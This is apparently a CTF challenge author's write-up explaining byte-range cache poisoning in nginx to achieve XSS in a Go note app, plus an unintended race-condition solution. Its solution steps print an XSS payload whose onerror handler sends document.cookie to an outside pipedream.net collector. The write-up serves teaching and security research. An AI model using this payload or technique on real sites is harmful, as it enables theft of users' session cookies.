---
title: "ACSC 2023 Gotion Challenge Author Writeup"
date: 2023-03-12T00:00:00+09:00
url: /posts/2023-03-12-acsc-2023-gotion/
type: post
showTableOfContents: true
---

I made a Gotion Challenge in [ACSC](https://acsc.asia/) (Asian Cyber Security Challenge) 2023.

This is a byte-range cache poisoning XSS challenge.

Challenge Description:

```
Gotion is yet another simple secure note service. You might have seen these kind of applications many times before, but try this one!
```

Challenge Repository: <https://github.com/tyage/acsc2023-gotion>

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">In ACSC 2023, I made a Gotion challenge and promotion video :) Thank you everyone who played! <a href="https://t.co/SN4PXKkKid">pic.twitter.com/SN4PXKkKid</a></p>&mdash; もうダニ by 左京区在中 (@tyage) <a href="https://twitter.com/tyage/status/1629679515529281536?ref_src=twsrc%5Etfw">February 26, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

# Challenge Details

The challenge has three components: Go web application, nginx and bot.
This is obviously an XSS challenge as the bot has FLAG in the cookie.

The Go app allows users to create simple note pages with only title and body.
The title "Gotion" is a parody of the famous note-taking app Notion and Go.

Users can enter title and body, but they are HTML escaped.
Therefore it is not possible to cause XSS in the notes page.

The key points here are that notes have their own unique URL and Gotion creates static HTML files for each note page like SSG (Static Site Generator).
Users can control the last part of the note URL, but they are only allowed to use restricted characters `[a-zA-Z0-9 ]`.

Looking inside nginx, the config file has a suspicious cache directive.

```nginx
proxy_cache_path /tmp/nginx keys_zone=mycache:10m;
server {
    listen 80;

    location ~ .mp4$ {
        # Smart and Efficient Byte-Range Caching with NGINX
        # https://www.nginx.com/blog/smart-efficient-byte-range-caching-nginx/
        proxy_cache mycache;
        slice              4096; # Maybe it should be bigger?
        proxy_cache_key    $host$uri$is_args$args$slice_range;
        proxy_set_header   Range $slice_range;
        proxy_http_version 1.1;
        proxy_cache_valid  200 206 1h;
        proxy_pass http://app:3000;
    }

    location / {
        proxy_pass http://app:3000;
    }
}
```

This directive caches an mp4 file, but it is not a normal cache, it is a [byte-range cache](https://www.nginx.com/blog/smart-efficient-byte-range-caching-nginx/) which allows us to cache part of the content.
When a client requests `Range: bytes=0-1000`, nginx requests the content with a `Range: bytes=0-4095` header to the origin server and caches the response.
If a client requests `Range: bytes=0-1000` again, nginx can respond quickly because there is a cache of the first 4096 bytes.

This config file also has an error in the location directive.
The `.` in `location ~ .mp4$` does not mean `.` but any character, because this is RegExp.
This directive was made for the video file `howto.mp4` but the file such as `FOOBARmp4` will unfortunately be cached.

# Solution

The solution is byte range cache poisoning, which causes nginx to return HTML containing XSS payload.

This is possible because nginx concatenates segmented caches.
Consider a situation where nginx has the content cache, but only the first 4096 bytes, and the content was updated later.
When a client makes a request without a range header, nginx will retrieve the rest of the updated content and concatenate it with the first cache.

In other words, we can concatenate the sliced parts of two different HTMLs!

The steps to exploit this into XSS are below.

1. Create a note page whose URL ends with `AAAAAAAAAAAAAAAAAmp4` so that it will be cached.

2. Modify the HTML of the note so that the first 4096 bytes end with `<`.

The first 4096 bytes of HTML will look like this

```html
<!DOCTYPE html>
<html lang="en">

<head>
...
          <textarea name="body" class="form-control" placeholder="note" style="height: 300px;">AAAA...AAAAA<
```

3. Cache the first 4096 bytes with a range header `curl http://.../...AAAAAAAAAAAAAAAAAmp4 -H "Range: bytes=0-4095"`.

4. Update the page so that the second 4096 bytes block starts with `img src=x onerror=[payload here]`.

The second block will look like this

```html
img src=x onerror=location=`//eo7x31ojradre3r.m.pipedream.net/?c=${document.cookie}` x=</textarea>
...
</body>

</html>
```

5. Report the URL `http://.../...AAAAAAAAAAAAAAAAAmp4`

6. Wait for the flag and done!

The full solution script is here <https://github.com/tyage/acsc2023-gotion/blob/main/solution/solve.py>.

# Unintended Solution

There is an unintended solution.
I forgot to write an exclusive lock when Go app write a HTML to file.

<https://github.com/tyage/acsc2023-gotion/blob/main/app/main.go#L117>

```go
		f, err := os.OpenFile(noteFilePath, os.O_WRONLY|os.O_TRUNC, 0644)
		if err != nil {
			http.Error(w, "invalid note", http.StatusInternalServerError)
			return
		}

		WriteNote(f, NoteParam{
			Id:    noteId,
			URL:   noteURL,
			Title: title,
			Body:  body,
		})
```

It causes race condition when the app process `WriteNote` at the same time and it was possible to store broken HTML causing XSS.

# Comment

To make a challenge solvable, origin HTTP server must support byte-range request and must *not* return E-Tag header.
Fortunately, Go net/http server meets these requirements therefore I chose the Go server.

Not only nginx but also some other HTTP cache servers and CDNs have this kind of implementation, so I think this concept has a chance to be exploited in a real environment.

I think this is the first PoC of byte-range cache poisoning XSS and I wish the participants have enjoyed the challenge!
